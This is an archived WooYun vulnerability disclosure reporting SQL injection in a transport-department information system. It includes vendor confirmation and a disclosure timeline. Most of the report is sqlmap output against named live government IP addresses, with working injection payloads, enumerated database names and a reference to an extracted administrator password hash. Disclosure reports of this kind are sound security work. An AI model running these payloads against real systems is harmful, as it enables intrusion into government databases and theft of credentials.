<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		全国交通系统某信息管理系统SQL注入涉及全国各省交通厅  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		全国交通系统某信息管理系统SQL注入涉及全国各省交通厅  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/霍大然">霍大然</a> 
</li><li>提交时间：		2013-10-23 10:45</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-10-23：	细节已通知厂商并且等待厂商处理中<br/>
									2013-10-27：	厂商已经确认，细节仅向厂商公开<br/>
									2013-11-06：	细节向核心白帽子及相关领域专家公开<br/>
									2013-11-16：	细节向普通白帽子公开<br/>
									2013-11-26：	细节向实习白帽子公开<br/>
									2013-12-07：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">全国交通系统某信息管理系统SQL注入，涉及全国各省交通厅，给20吧，贴了好多图</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">1、陕西的：<br />
<br />
http://113.140.70.184:4016/forUI/default.aspx<br />
<br />
</p><p class="detail"><a href="../images/0711251361e23882a82a34cc3eb51ccaa510bd28.png" target="_blank"><img src="../images/0711251361e23882a82a34cc3eb51ccaa510bd28.png" alt="2-1.PNG" width="600"/></a></p><p class="detail"><br />
<br />
注入点：<br />
<br />
http://113.140.70.184:4016/forui/corpinfo/corpbaseinfo.aspx?CorpCode=1<br />
<br />
Place: GET<br />
<br />
Parameter: ID<br />
<br />
    Type: boolean-based blind<br />
<br />
    Title: AND boolean-based blind - WHERE or HAVING clause<br />
<br />
    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6&#039; AND 2037=2037 AND &#039;FixY&#039;=&#039;FixY<br />
<br />
<br />
<br />
    Type: error-based<br />
<br />
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause<br />
<br />
    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6&#039; AND 1147=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(108)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (1147=1147) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(114)+CHAR(119)+CHAR(98)+CHAR(58))) AND &#039;SXpO&#039;=&#039;SXpO<br />
<br />
<br />
<br />
    Type: stacked queries<br />
<br />
    Title: Microsoft SQL Server/Sybase stacked queries<br />
<br />
    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6&#039;; WAITFOR DELAY &#039;0:0:5&#039;;--<br />
<br />
<br />
<br />
    Type: AND/OR time-based blind<br />
<br />
    Title: Microsoft SQL Server/Sybase time-based blind<br />
<br />
    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6&#039; WAITFOR DELAY &#039;0:0:5&#039;--<br />
<br />
---<br />
<br />
<br />
<br />
available databases [4]:<br />
<br />
[*] hs_sx_glj<br />
<br />
[*] master<br />
<br />
[*] model<br />
<br />
[*] msdb<br />
<br />
</p><p class="detail"><a href="../images/07112557c4f94f77eb22a60355357a4bd843c8bf.png" target="_blank"><img src="../images/07112557c4f94f77eb22a60355357a4bd843c8bf.png" alt="2-2.PNG" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/0711263115134650f764f88de8edaad3e21e899c.png" target="_blank"><img src="../images/0711263115134650f764f88de8edaad3e21e899c.png" alt="2-3.PNG" width="600"/></a></p><p class="detail"><br />
<br />
管理员密码的hash:<br />
<br />
</p><p class="detail"><a href="../images/0711272605f2486cc57ec629c5b3ae8f4437fd96.png" target="_blank"><img src="../images/0711272605f2486cc57ec629c5b3ae8f4437fd96.png" alt="2-4.PNG" width="600"/></a></p><p class="detail"><br />
<br />
2、北京<br />
<br />
http://210.75.218.36/forUI/default.aspx<br />
<br />
</p><p class="detail"><a href="../images/07112830e30fe2081741a2def764b74e96bea893.png" target="_blank"><img src="../images/07112830e30fe2081741a2def764b74e96bea893.png" alt="2-5.PNG" width="600"/></a></p><p class="detail"><br />
<br />
注入点：<br />
<br />
http://210.75.218.36/forUI/CorpInfo/CorpBaseInfo.aspx?CorpCode=63377640<br />
<br />
Place: GET<br />
<br />
Parameter: CorpCode<br />
<br />
    Type: UNION query<br />
<br />
    Title: Generic UNION query (NULL) - 63 columns<br />
<br />
    Payload: CorpCode=63377640&#039; UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(114)+CHAR(115)+CHAR(109)+CHAR(58)+CHAR(99)+CHAR(68)+CHAR(109)+CHAR(102)+CHAR(101)+CHAR(81)+CHAR(109)+CHAR(79)+CHAR(67)+CHAR(65)+CHAR(58)+CHAR(114)+CHAR(117)+CHAR(109)+CHAR(58)-- <br />
<br />
<br />
<br />
    Type: stacked queries<br />
<br />
    Title: Microsoft SQL Server/Sybase stacked queries<br />
<br />
    Payload: CorpCode=63377640&#039;; WAITFOR DELAY &#039;0:0:5&#039;;--<br />
<br />
<br />
<br />
    Type: AND/OR time-based blind<br />
<br />
    Title: Microsoft SQL Server/Sybase time-based blind<br />
<br />
    Payload: CorpCode=63377640&#039; WAITFOR DELAY &#039;0:0:5&#039;--<br />
<br />
---<br />
<br />
<br />
<br />
available databases [10]:<br />
<br />
[*] BJ_HONOR<br />
<br />
[*] BJ_HONOR0412<br />
<br />
[*] BJ_HONOR_NOW<br />
<br />
[*] master<br />
<br />
[*] model<br />
<br />
[*] msdb<br />
<br />
[*] Northwind<br />
<br />
[*] ot_hs_bj_now<br />
<br />
[*] pubs<br />
<br />
[*] tempdb<br />
<br />
3、西藏<br />
<br />
网站地址：<br />
<br />
http://219.151.34.147:801<br />
<br />
注入点：<br />
<br />
http://219.151.34.147:801/forUI/CorpInfo/CorpBaseInfo.aspx?CorpCode=20282728<br />
<br />
lace: GET<br />
<br />
Parameter: CorpCode<br />
<br />
    Type: UNION query<br />
<br />
    Title: Generic UNION query (NULL) - 63 columns<br />
<br />
    Payload: CorpCode=20282728&#039; UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(100)+CHAR(108)+CHAR(97)+CHAR(58)+CHAR(83)+CHAR(85)+CHAR(66)+CHAR(109)+CHAR(102)+CHAR(121)+CHAR(65)+CHAR(108)+CHAR(67)+CHAR(75)+CHAR(58)+CHAR(112)+CHAR(101)+CHAR(116)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- <br />
<br />
<br />
<br />
    Type: stacked queries<br />
<br />
    Title: Microsoft SQL Server/Sybase stacked queries<br />
<br />
    Payload: CorpCode=20282728&#039;; WAITFOR DELAY &#039;0:0:5&#039;;--<br />
<br />
<br />
<br />
    Type: AND/OR time-based blind<br />
<br />
    Title: Microsoft SQL Server/Sybase time-based blind<br />
<br />
    Payload: CorpCode=20282728&#039; WAITFOR DELAY &#039;0:0:5&#039;--<br />
<br />
---<br />
<br />
<br />
<br />
available databases [7]:<br />
<br />
[*] master<br />
<br />
[*] model<br />
<br />
[*] msdb<br />
<br />
[*] ot_hs_xz<br />
<br />
[*] ReportServer<br />
<br />
[*] ReportServerTempDB<br />
<br />
[*] tempdb<br />
<br />
<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">不一个一个找了，百度吧：<br />
<br />
</p><p class="detail"><a href="../images/07112946ebb756291bfd8b9162becbda0be21c3f.png" target="_blank"><img src="../images/07112946ebb756291bfd8b9162becbda0be21c3f.png" alt="2-6.PNG" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">过滤 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/霍大然" title="霍大然">霍大然</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036353" title="全国交通系统某信息管理系统SQL注入涉及全国各省交通厅">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-10-27 23:32</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD确认并复现多个实例，此前已经通报过该案例，已经向交通部中国交通信息中心通报，同时也抄报交通部公路科学研究院。<br />
<br />
rank 20</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="36353";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
